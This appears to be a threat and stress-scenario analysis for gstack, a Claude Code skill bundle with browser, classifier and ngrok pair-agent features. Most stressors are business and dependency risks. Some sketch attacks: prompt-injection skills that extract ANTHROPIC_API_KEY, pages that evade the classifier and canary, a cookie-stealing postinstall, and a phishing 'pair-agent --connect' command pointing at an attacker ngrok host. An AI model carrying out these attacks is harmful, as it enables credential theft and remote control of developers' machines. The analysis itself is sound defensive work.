naive_architecture.summary: gstack is a developer toolkit + Claude Code skill bundle. A `./setup` script installs compiled binaries (browse, design) and symlinks ~30 named skills into ~/.claude/skills. Users invoke skills (/ship, /review, /office-hours, /browse, /codex, /investigate, etc.) from inside Claude Code; some skills shell out to the local browse PTY (Chromium via Playwright); a pair-agent daemon optionally exposes a locked subset of the local API over an ngrok tunnel so a phone can drive the laptop's claude session.
naive_architecture.business_context: Customers are software engineers and startup founders (notably YC founders and indie devs) who use Claude Code as a daily driver. Value moments: one-shot install of curated review/ship/QA skills; YC-style founder critique via /office-hours; eval-gated /ship with auto-bumped CHANGELOG; remote phone control of an active claude REPL via pair-agent. Revenue is indirect (ecosystem play around Anthropic + Claude Code).

stressors.name: Anthropic ToS bans automated CI invocation
stressors.description: Anthropic updates the Acceptable Use Policy to forbid `claude -p` invocations from headless CI without an enterprise plan. CI eval pipeline halts overnight; /ship blocks every merge until paid plan and key rotation are arranged. Business consequence: feature velocity drops to zero until Garry adopts Claude for Work.

stressors.name: EU AI Act classifies prompt-injection classifiers as high-risk
stressors.description: EU AI Act enforcement classifies the embedded TestSavantAI / DeBERTa classifiers as 'high-risk AI systems' inside a developer tool, requiring conformity assessment, EU representative, and documented training data lineage before EU developers may install. Business consequence: gstack must either ship without ML defense in EU (downgrade to L1-L3 + canary) or undertake a multi-month conformity workstream.

stressors.name: GDPR deletion request against salted attack log
stressors.description: An EU developer files a GDPR Article 17 deletion request: the salted-sha256 entries in their ~/.gstack/security/attempts.jsonl are arguably personal data because they tie a per-device salt to attempted-attack timestamps. Business consequence: gstack must offer a per-device deletion command and audit-trail proof, or face supervisory authority escalation.

stressors.name: Free OSS skill bundle with native tunneling launches
stressors.description: A community project ships a free, MIT-licensed bundle of equivalent skills (review/ship/QA) plus Tailscale-based tunneling (no ngrok dep). It hits Hacker News front page and indie-dev social media. Business consequence: gstack's adoption among solo devs flatlines for 6 months while the team decides whether to compete on quality, scope, or commercial terms.

stressors.name: Karpathy reviews gstack on YouTube
stressors.description: A high-profile engineer (Karpathy / DHH / fly.io blog) publishes a deep-dive of gstack and recommends it. Install attempts spike 100× over 48 hours; ClawHub rate-limits new skill installs; ANTHROPIC_API_KEY budgets across the contributor base burn through monthly quota in a day. Business consequence: gstack converts the moment into traction or fumbles it as a 502 page on a viral install run.

stressors.name: Claude Code natively bundles equivalent skills
stressors.description: Anthropic ships a curated /review, /ship, /qa as first-party Claude Code skills in the next minor release. Business consequence: gstack's commodity layer evaporates, and the bundle's perceived value collapses to the differentiated tier (/office-hours, /design-shotgun, pair-agent). Garry has to decide whether to shrink scope or compete with the platform owner.

stressors.name: Bun 2.0 breaks `bun build --compile` on macOS arm64
stressors.description: A Bun major release changes the compile target ABI; freshly built browse and design binaries segfault on user laptops at first run. ./setup fails for every new install simultaneously. Business consequence: install conversion rate drops to ~0 until the team pins Bun, ships a fallback non-compiled mode, or patches Bun upstream.

stressors.name: Anthropic API auth or endpoint URL changes
stressors.description: Anthropic deprecates the legacy auth scheme (e.g. moves x-api-key to OAuth, or moves endpoint hostname). All in-flight `claude -p` calls in CI 401. Business consequence: every E2E eval baseline becomes unsigned for a week; /ship blocks merges; teams using gstack across 3+ machines hit it staggered as their config caches expire.

stressors.name: onnxruntime-node Node-ABI incompatibility breaks classifier silently
stressors.description: A node-ABI version bump renders the precompiled onnxruntime-node wheel unloadable on a user's Node version. The classifier import throws, the security stack silently degrades to L1-L3 + canary only without alarm because security.ts catches the import failure. Business consequence: prompt-injection defense quietly drops a tier without anyone noticing until the first real attack.

stressors.name: ngrok agent v3→v4 changes default tunnel headers
stressors.description: ngrok ships a major version that changes default forwarded headers (e.g. removes X-Forwarded-Proto, renames its tunnel-marker header). The pair-agent's allowlist matcher silently lets in or rejects the wrong traffic — either local-grade tokens get accepted over the tunnel, or legitimate phone control gets 403'd. Business consequence: silent privilege escalation OR silent feature loss; either way it propagates by ngrok auto-update.

stressors.name: TLS 1.3 ECH default in Chrome breaks tunnel sniffing
stressors.description: Chrome turns on Encrypted Client Hello by default; ngrok's free tier no longer surfaces the original Host header reliably; pair-agent loses its ability to distinguish local vs tunnel listener at the application layer. Business consequence: forced redesign of dual-listener security model, not just patch — affects every existing pair-agent deployment that had relied on header-based scope checks.

stressors.name: Maintainer-vacation CVE in onnxruntime-node
stressors.description: Garry is on vacation when a high-severity CVE in onnxruntime-node lands. No one else has merge rights or context on the security-stack module boundaries (no imports from token-registry into sse-session-cookie, etc.). Business consequence: 5-day window where users either pin the vulnerable dep or break their installs; reputational hit to gstack as 'one-person project'.

stressors.name: Contributor regresses pair-agent token scope
stressors.description: A community PR rewrites the pair-agent token registry for cleanliness. The eval gate passes (E2E tests don't cover token-scope cross-leak), but a regression lets a tunnel-scoped token call /command outside the 26-command allowlist. Business consequence: silent privilege escalation in a release that already shipped; the canary-watch step doesn't surface it because it watches health metrics, not security invariants.

stressors.name: Live-symlink user resets repo mid-session
stressors.description: A user with the dev symlink (.claude/skills/gstack → working tree) runs `git pull && git reset --hard` while a parallel claude session is mid-/ship. Half-written SKILL.md files load into the parallel session; /ship's view of CHANGELOG races against the reset. Business consequence: a published v<VERSION> may go out with a stale CHANGELOG entry; CI may pick up partially regenerated SKILL.md files.

stressors.name: /office-hours gives reputation-damaging advice to a YC founder
stressors.description: A YC founder uses /office-hours, gets a recommendation that produces concrete business harm (e.g. 'pivot away from your current customer segment' three weeks before a layoff round). The story makes Twitter; gstack catches blame. Business consequence: trust in the differentiated tier (/office-hours, /codex, /design-shotgun) erodes; competing skills paint themselves as 'safer'.

stressors.name: Impostor 'gstack-residuality' skill on ClawHub
stressors.description: A bad actor publishes a skill on ClawHub with a confusable name (gstack-residuality, gstack-review-pro) containing prompt-inject payloads aimed at extracting ANTHROPIC_API_KEY from ~/.zshrc via instructions disguised as setup steps. ClawHub does not verify slug ownership against the canonical gstack publisher. Business consequence: a meaningful fraction of installs end up with a malicious skill colocated with the real ones.

stressors.name: Distributed canary-stripping prompt-injection campaign
stressors.description: A coordinated SEO-poisoning campaign places thousands of Stack-Overflow-shaped pages with zero-day evasions of the L4 ONNX classifier and L5 canary detection (the canary pattern leaks via training-data extraction). /browse users hitting these pages during QA workflows get instructions exfiltrated to attacker-controlled endpoints. Business consequence: the blog post about gstack's prompt-injection defense becomes a liability.

stressors.name: Hostile npm dep in the chrome-extension steals tokens
stressors.description: An xterm.js add-on (or an extension build dep) is taken over and ships a token-stealer in a postinstall script that scrapes any cookie matching /^gstack_(pty|sse)=/ from the user's browser. Business consequence: an attacker with a leaked gstack_sse can call /sidebar-chat over the tunnel for the cookie's 30-min lifetime.

stressors.name: Phishing victim pastes attacker's pair-agent /connect URL
stressors.description: An attacker phishes an early-adopter dev with a Slack DM 'try the new gstack remote demo: gstack pair-agent --connect https://attacker.ngrok.app/connect?token=...'. The pair-agent honors the URL because /connect's contract is a token + URL pair, not a domain allowlist. Business consequence: the attacker gets phone-scope command execution on the victim's laptop until the victim notices and kills the daemon.

stressors.name: Insider threat: ex-contributor's stale ClawHub credentials
stressors.description: A former contributor with valid clawhub publish credentials for one of the gstack-openclaw-* slugs ships a malicious patch version after they've left the project. Business consequence: every existing OpenClaw user pulling skill updates from ClawHub gets the bad version until the slug is reclaimed.

stressors.name: Mid-eval Wi-Fi loss creates inconsistent eval-store state
stressors.description: User's laptop loses Wi-Fi 18 minutes into a 30-minute eval suite. Anthropic API requests time out; the eval-store at ~/.gstack-dev/evals/ accumulates partial results that downstream `eval:compare` and `eval:summary` mis-aggregate as regressions. Business consequence: false-positive regressions block the next /ship until someone manually purges the partial run.

stressors.name: ngrok metered tier rate-caps free tunnels
stressors.description: ngrok introduces a metered free tier that caps tunnel throughput at 1 req/sec or charges per-connection. pair-agent demos become unusable at conference-day load. Business consequence: pair-agent's perceived demo quality collapses; gstack must either bundle Tailscale/Cloudflare-tunnel as alternative or stop demoing it live.

stressors.name: xterm.js or extension dep hijack
stressors.description: A core npm dep used by extension/ (xterm.js, an addon, or a build tool) gets handed to a bad actor who ships a token-stealing postinstall on the next minor. Business consequence: every fresh install or `bun install` rebuild from the gstack repo runs the malicious postinstall; gstack's own CI may run it before tests fail.

stressors.name: Sustained Anthropic 429s during peak hours
stressors.description: Anthropic API returns sustained rate-limit errors during peak (US morning) hours for a week. CI eval gates time out, /office-hours returns errors mid-session, /codex falls back to OpenAI for everyone. Business consequence: feature velocity halves while teams figure out whether to pay up, batch differently, or shift to off-peak hours.

stressors.name: Large-monorepo user hits gen-skill-docs O(n²) on file count
stressors.description: A user adopts gstack on a 50K-file monorepo. gen-skill-docs and slop-scan diff both walk file lists in O(n²); /ship takes 12 minutes per merge instead of 30 seconds. Business consequence: the team disables /ship's pre-merge checks to keep dev velocity, defeating the eval gate.

stressors.name: 200-engineer team-mode install rate-limits ClawHub
stressors.description: An org rolls gstack across 200 engineers via `./setup --team`; the first day's ClawHub publish + install activity rate-limits the team. Business consequence: half the engineers get partial installs and resort to copy-pasting from teammates' laptops, breaking the install audit chain.

stressors.name: Eval-store accumulates 800 runs and slows /ship
stressors.description: A heavy contributor's ~/.gstack-dev/evals/ has 800+ runs accumulated over a year. eval:compare and the auto-pick-most-recent logic in /ship walk the full directory each invocation; /ship adds 3 minutes per merge. Business consequence: contributors stop running the full eval suite locally and let CI catch issues, slowing the diagnose loop.

stressors.name: Sonnet model deprecation cascades through baselines
stressors.description: Anthropic deprecates Sonnet 4.6 with 90 days notice. Every eval-store baseline encodes the model ID; every prompt-cache hit assumes a stable model. Migrating means recalibrating LLM-as-judge thresholds across all skills' E2E suites simultaneously. Business consequence: a 90-day migration project the team didn't plan for; until done, evals report drift as regressions.

stressors.name: Suspend-wake silently expires 30-min SSE cookie
stressors.description: User opens pair-agent, drives phone for 5 minutes, suspends laptop, wakes 45 minutes later. The 30-min gstack_sse cookie has silently expired during sleep; reconnect attempts fail without surfacing the expiry. The user thinks they have phone control and is surprised when commands no-op. Business consequence: trust regression on the pair-agent demo path.

stressors.name: GSTACK_SECURITY_OFF=1 left in shell rc indefinitely
stressors.description: A contributor sets GSTACK_SECURITY_OFF=1 in ~/.zshrc to bypass an annoying false-positive once. It stays there for 6 months because nothing reminds them to remove it. Business consequence: every /browse session that whole period runs without ML prompt-injection defense, and the developer has no UX signal that the layer is off.

stressors.name: On-prem ML inference banned for AI-safety reasons
stressors.description: A government (US, EU, or AU) classifies on-device ML inference of safety-related models as requiring central licensing for AI-safety reasons. Locally-cached TestSavantAI / DeBERTa stop being legal to ship in classifier mode. Business consequence: gstack must move L4 to a server-side API (new operational surface) or excise it (downgrade defense).

stressors.name: Viral TikTok of /office-hours for personal-life questions
stressors.description: A 30-second TikTok shows a teenager using /office-hours to get YC-style critique on their college decision. It gets 8M views. Demand 50× from non-engineers; ANTHROPIC_API_KEY budgets across the contributor base evaporate; the skill's rude-direct-Garry voice collides with non-engineer audiences and produces screenshot drama. Business consequence: gstack must decide whether to filter user types, restrict the skill, or ride the moment commercially.

stressors.name: Cosmic-ray bit-flip in cached ONNX model
stressors.description: A cosmic-ray-induced bit flip silently corrupts the cached testsavant-small ONNX file on a user's disk. The classifier loads, produces near-random scores, and the L4+L4b ensemble blocks 30% of legitimate web pages and lets through 30% of attacks. No checksum is enforced on the model file. Business consequence: a slow-burn quality regression that looks like 'the classifier got worse over time' — easy to misdiagnose as model drift.
